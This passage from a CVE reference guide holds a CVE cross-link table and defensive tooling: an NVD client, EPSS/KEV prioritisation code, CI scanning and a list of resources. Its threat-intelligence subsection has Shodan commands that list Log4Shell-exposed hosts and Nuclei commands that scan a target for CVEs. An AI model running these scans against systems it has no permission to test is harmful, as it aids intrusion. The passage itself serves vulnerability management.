| [CVE-2023-34362](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-34362) | [CVE Reference Guide](/CVE_REFERENCE.md), [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Malware Analysis Reference](/MALWARE_ANALYSIS_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Cl0p MOVEit Breach and the File-Transfer Extortion Playbook: A 2023 Case Study](/case-studies/CL0P_FILE_TRANSFER_2023.md), [Case Studies](/case-studies/README.md) |
| [CVE-2023-44487](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-44487) | [Network Protocols Reference: Security Perspective](/NETWORK_PROTOCOLS_REFERENCE.md) |
| [CVE-2023-46747](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-46747) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md) |
| [CVE-2023-46805](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2023-46805) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2024-0519](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-0519) | [Browser Security Reference](/BROWSER_SECURITY_REFERENCE.md) |
| [CVE-2024-1086](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-1086) | [Linux Hardening Reference Library](/LINUX_HARDENING_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2024-1708](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-1708) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2024-1709](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-1709) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2024-3094](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-3094) | [Supply Chain Security Reference](/SUPPLY_CHAIN_SECURITY_REFERENCE.md), [Case Studies](/case-studies/README.md), [The XZ Utils Backdoor: A 2024 Supply-Chain Case Study](/case-studies/XZ_UTILS_BACKDOOR_2024.md), [Supply Chain Security](/disciplines/supply-chain-security.md) |
| [CVE-2024-3400](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-3400) | [ATT&CK Campaigns Reference](/ATTACK_CAMPAIGNS_REFERENCE.md), [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Telecom & 5G Security Reference](/TELECOM_5G_SECURITY_REFERENCE.md), [Splunk Enterprise Security](/tools/splunk.md), [Tenable](/tools/tenable.md) |
| [CVE-2024-4040](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-4040) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2024-4577](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-4577) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2024-8956](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-8956) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2024-8957](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-8957) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2024-20353](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-20353) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md) |
| [CVE-2024-20359](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-20359) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md) |
| [CVE-2024-21887](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-21887) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Telecom & 5G Security Reference](/TELECOM_5G_SECURITY_REFERENCE.md) |
| [CVE-2024-24919](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-24919) | [Vulnerability Prioritization Reference (SSVC, KEV, EPSS)](/VULNERABILITY_PRIORITIZATION_REFERENCE.md) |
| [CVE-2024-37085](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-37085) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md) |
| [CVE-2024-38812](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-38812) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md) |
| [CVE-2024-39717](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-39717) | [ATT&CK Campaigns Reference](/ATTACK_CAMPAIGNS_REFERENCE.md) |
| [CVE-2024-40766](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-40766) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2024-47575](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-47575) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2024-50623](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-50623) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Cl0p MOVEit Breach and the File-Transfer Extortion Playbook: A 2023 Case Study](/case-studies/CL0P_FILE_TRANSFER_2023.md), [Case Studies](/case-studies/README.md) |
| [CVE-2024-54085](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-54085) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2024-55591](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-55591) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md) |
| [CVE-2024-55956](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2024-55956) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Cl0p MOVEit Breach and the File-Transfer Extortion Playbook: A 2023 Case Study](/case-studies/CL0P_FILE_TRANSFER_2023.md), [Case Studies](/case-studies/README.md) |
| [CVE-2025-0282](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-0282) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2025-0994](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-0994) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2025-1316](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-1316) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2025-3248](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-3248) | [Langflow](/ai-tooling/tools/LANGFLOW.md), [AI Threats in the Cybersecurity Industry: A 2026 Case Study](/case-studies/AI_THREATS_2026.md) |
| [CVE-2025-5777](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-5777) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2025-7775](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-7775) | [AI Threats in the Cybersecurity Industry: A 2026 Case Study](/case-studies/AI_THREATS_2026.md) |
| [CVE-2025-14847](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-14847) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2025-20333](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-20333) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md) |
| [CVE-2025-20352](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-20352) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2025-20362](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-20362) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md) |
| [CVE-2025-21333](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-21333) | [Starred Repositories Index](/STARRED_REPOS.md) |
| [CVE-2025-22224](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-22224) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md) |
| [CVE-2025-22225](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-22225) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md) |
| [CVE-2025-22226](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-22226) | [Hypervisor & Virtualization Hardening Reference](/HYPERVISOR_SECURITY_REFERENCE.md) |
| [CVE-2025-22457](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-22457) | [Edge & Network Device Security Reference](/EDGE_DEVICE_SECURITY_REFERENCE.md) |
| [CVE-2025-31324](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-31324) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2025-32433](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-32433) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2025-32711](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-32711) | [AI Threats in the Cybersecurity Industry: A 2026 Case Study](/case-studies/AI_THREATS_2026.md) |
| [CVE-2025-42999](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-42999) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md) |
| [CVE-2025-49704](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-49704) | [ATT&CK Campaigns Reference](/ATTACK_CAMPAIGNS_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The SharePoint ToolShell Mass Exploitation: A 2025 Case Study](/case-studies/SHAREPOINT_TOOLSHELL_2025.md) |
| [CVE-2025-49706](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-49706) | [ATT&CK Campaigns Reference](/ATTACK_CAMPAIGNS_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The SharePoint ToolShell Mass Exploitation: A 2025 Case Study](/case-studies/SHAREPOINT_TOOLSHELL_2025.md) |
| [CVE-2025-53770](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-53770) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Case Studies](/case-studies/README.md), [The SharePoint ToolShell Mass Exploitation: A 2025 Case Study](/case-studies/SHAREPOINT_TOOLSHELL_2025.md) |
| [CVE-2025-53771](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-53771) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Case Studies](/case-studies/README.md), [The SharePoint ToolShell Mass Exploitation: A 2025 Case Study](/case-studies/SHAREPOINT_TOOLSHELL_2025.md) |
| [CVE-2025-67038](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-67038) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2025-68613](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-68613) | [n8n](/ai-tooling/tools/N8N.md) |
| [CVE-2026-33017](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-33017) | [Langflow](/ai-tooling/tools/LANGFLOW.md) |
| [CVE-2026-98432](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-98432) | [The CVE-2026-98432 Linux Kernel Flaw and an AI-Written Exploit: A 2026 Case Study](/case-studies/LINUX_TCP_UAF_2026.md), [The Multipath TCP Attack Surface: A 2026 Case Study](/case-studies/MPTCP_ATTACK_SURFACE_2026.md), [Case Studies](/case-studies/README.md), [Harden a Linux Host](/guides/HARDEN_A_LINUX_HOST.md) |
| [CVE-2026-109618](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-109618) | [PHP2Shell and the October 2026 Attack Wave: A Case Study](/case-studies/PHP2SHELL_OCTOBER_2026.md), [Case Studies](/case-studies/README.md) |
| [CVE-2026-109619](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-109619) | [PHP2Shell and the October 2026 Attack Wave: A Case Study](/case-studies/PHP2SHELL_OCTOBER_2026.md), [Case Studies](/case-studies/README.md) |
| [CVE-2026-110936](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-110936) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2026-111943](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-111943) | [The eMudhra Certificate Authority Key Compromise: A 2026 Case Study](/case-studies/EMUDHRA_CA_COMPROMISE_2026.md), [Case Studies](/case-studies/README.md) |

<!-- hub-links:end -->

---

## 10. CVE Automation & Tooling

### NVD API Python Client with SQLite Cache

    import requests, time, sqlite3, json
    from datetime import datetime, timedelta

    class NVDClient:
        BASE = "https://services.nvd.nist.gov/rest/json/cves/2.0"

        def __init__(self, api_key=None, db_path="nvd.db"):
            self.headers = {"apiKey": api_key} if api_key else {}
            self.delay = 0.6 if api_key else 6.0
            self.db = sqlite3.connect(db_path)
            self.db.execute(
                "CREATE TABLE IF NOT EXISTS cves "
                "(id TEXT PRIMARY KEY, data JSON, score REAL, severity TEXT, "
                "published TEXT, modified TEXT)"
            )

        def _req(self, params):
            time.sleep(self.delay)
            return requests.get(self.BASE, params=params,
                                headers=self.headers, timeout=30).json()

        def sync(self, hours=24):
            end = datetime.utcnow()
            start = end - timedelta(hours=hours)
            params = {
                "lastModStartDate": start.strftime("%Y-%m-%dT%H:%M:%S.000"),
                "lastModEndDate":   end.strftime("%Y-%m-%dT%H:%M:%S.000"),
                "resultsPerPage": 2000
            }
            count = 0
            while True:
                params["startIndex"] = count
                data = self._req(params)
                for item in data.get("vulnerabilities", []):
                    cve = item["cve"]
                    v31 = cve.get("metrics", {}).get("cvssMetricV31", [{}])[0].get("cvssData", {})
                    self.db.execute(
                        "INSERT OR REPLACE INTO cves VALUES (?,?,?,?,?,?)",
                        (cve["id"], json.dumps(cve), v31.get("baseScore"),
                         v31.get("baseSeverity"), cve.get("published"), cve.get("lastModified"))
                    )
                    count += 1
                self.db.commit()
                if count >= data.get("totalResults", 0):
                    break
            return count

        def critical_cves(self):
            return self.db.execute(
                "SELECT id, score FROM cves WHERE severity='CRITICAL' ORDER BY score DESC"
            ).fetchall()

### EPSS + KEV Combined Pipeline

    import requests

    def enrich_cves(cve_ids: list) -> list:
        enriched = {cid: {"cve_id": cid, "epss": 0.0, "pct": 0.0,
                          "in_kev": False, "kev_due": ""} for cid in cve_ids}

        # EPSS
        for i in range(0, len(cve_ids), 100):
            batch = ",".join(cve_ids[i:i+100])
            r = requests.get(f"https://api.first.org/data/v1/epss?cve={batch}")
            for e in r.json().get("data", []):
                if e["cve"] in enriched:
                    enriched[e["cve"]]["epss"] = float(e["epss"])
                    enriched[e["cve"]]["pct"] = float(e["percentile"])

        # KEV
        kev = requests.get(
            "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
        ).json()
        for v in kev["vulnerabilities"]:
            if v["cveID"] in enriched:
                enriched[v["cveID"]]["in_kev"] = True
                enriched[v["cveID"]]["kev_due"] = v.get("dueDate", "")
                enriched[v["cveID"]]["ransomware"] = v.get("knownRansomwareUse") == "Known"

        def tier(e):
            if e["in_kev"] or e["epss"] > 0.70: return "T1-Emergency"
            if e["epss"] > 0.10: return "T2-Critical"
            if e["epss"] > 0.01: return "T3-High"
            return "T4-Normal"

        result = list(enriched.values())
        result.sort(key=lambda x: (x["in_kev"], x["epss"]), reverse=True)
        for e in result:
            e["tier"] = tier(e)
        return result

### Vulnerability Intelligence Pipeline Architecture

    [NVD API] [EPSS API] [KEV Feed] [OSV] [Vendor RSS]
         |         |          |       |         |
         +---------+----------+-------+---------+
                              |
               [Normalization Layer (CVE as key)]
                              |
               [Enrichment DB: CVSS+EPSS+KEV+ExploitDB+ADP]
                              |
               [Prioritization Engine (tier assignment)]
                              |
          +------------------+-------------------+
          |                  |                   |
    [SIEM/SOAR]      [Ticket System]      [Dashboard/API]

### Open Source VM Platforms

DefectDojo (github.com/DefectDojo/django-DefectDojo):

    # Import scanner results (100+ formats supported)
    curl -X POST https://defectdojo.example.com/api/v2/import-scan/       -H "Authorization: Token $TOKEN"       -F "scan_type=Trivy Scan" -F "file=@trivy.json"       -F "product_name=My App" -F "engagement_name=Sprint-42"

Dependency-Track (github.com/DependencyTrack/dependency-track):

    # Upload SBOM for continuous tracking
    curl -X PUT https://dtrack.example.com/api/v1/bom       -H "X-Api-Key: $DT_KEY"       -F "projectName=My App" -F "projectVersion=2.1.0"       -F "autoCreate=true" -F "bom=@sbom.cdx.json"

### CI/CD Security Scanning

    # GitHub Actions -- vulnerability gate
    - name: Trivy scan
      uses: aquasecurity/trivy-action@master
      with:
        image-ref: myapp:${{ github.sha }}
        format: sarif
        output: trivy-results.sarif
        severity: CRITICAL,HIGH
        exit-code: '1'
        ignore-unfixed: true

    - name: Upload to GitHub Security tab
      uses: github/codeql-action/upload-sarif@v3
      if: always()
      with:
        sarif_file: trivy-results.sarif

### Threat Intelligence Tools

Shodan CVE search:

    shodan count "vuln:CVE-2021-44228"
    shodan search "vuln:CVE-2021-44228" --fields ip_str,port,org,country_code

Nuclei CVE templates:

    nuclei -t cves/ -u https://target.com -severity critical,high -o results.json
    nuclei -t cves/2021/CVE-2021-44228.yaml -u https://target.com
    nuclei -update-templates

### CISA ADP Enrichment

CISA-ADP publishes machine-readable enrichment in CVE JSON 5.0 `containers.adp` array,
often 24-72 hours before NVD updates. Key signals:

    "adp": [{
      "providerMetadata": {"shortName": "CISA-ADP"},
      "metrics": [{"other": {"type": "ssvc", "content": {
        "options": [
          {"Exploitation": "active"},   // none | poc | active
          {"Automatable": "yes"},       // yes | no (wormability)
          {"Technical Impact": "total"} // partial | total
        ]
      }}}]
    }]

`Exploitation: active` in CISA-ADP data is an early warning signal equivalent to
KEV membership. It often appears before formal KEV catalog addition.

---

## Key External Resources

Curated vulnerability databases, exploit intelligence, and PoC sources for CVE research and enrichment.

| Resource | URL |
|---|---|
| CVE Details | cvedetails.com |
| OpenCVE | https://www.opencve.io/ |
| GitHub Advisory Database | https://github.com/advisories |
| VulnCheck | https://vulncheck.com/ |
| Vulners | https://vulners.com/ |
| VulDB | vuldb.com |
| Snyk Vulnerability DB | https://security.snyk.io/ |
| Mend Vulnerability DB | https://www.mend.io/vulnerability-database/ |
| Rapid7 Vuln & Exploit DB | https://www.rapid7.com/db/ |
| Tenable CVE Database | https://www.tenable.com/cve |
| cvecrowd (trending CVEs) | https://cvecrowd.com/ |
| Metasploit Modules (Rapid7 DB) | https://www.rapid7.com/db/?type=metasploit |
| Nuclei Templates | https://github.com/projectdiscovery/nuclei-templates |
| PoC-in-GitHub (nomi-sec) | https://github.com/nomi-sec/PoC-in-GitHub |
| Trickest CVE → PoC | https://github.com/trickest/cve |
| Packet Storm | https://packetstormsecurity.com/ |
| Sploitus | https://sploitus.com/ |
| VulnCheck XDB (exploits) | https://vulncheck.com/xdb |

---

*Last updated: 2026-05-07 | Covers CVE program architecture, CVSS v3.1/v4.0,
EPSS, CISA KEV, vulnerability databases, research methodology, patch management,
notable case studies, and automation tooling.*

<!-- related:start (written by scripts/build_crosslinks.py; do not edit) -->

## Related pages

- Domain: [GRC and security program](/hubs/grc-and-security-program.md)
- [CWE Weakness Reference](/CWE_REFERENCE.md)
- [CTEM Reference](/CTEM_REFERENCE.md)
- [Fuzzing & Vulnerability Research](/FUZZING_VULNERABILITY_RESEARCH.md)
- [Exploit Development Reference](/EXPLOIT_DEVELOPMENT_REFERENCE.md)
- [Vulnerability Management](/VULNERABILITY_MANAGEMENT_REFERENCE.md)

<!-- related:end -->
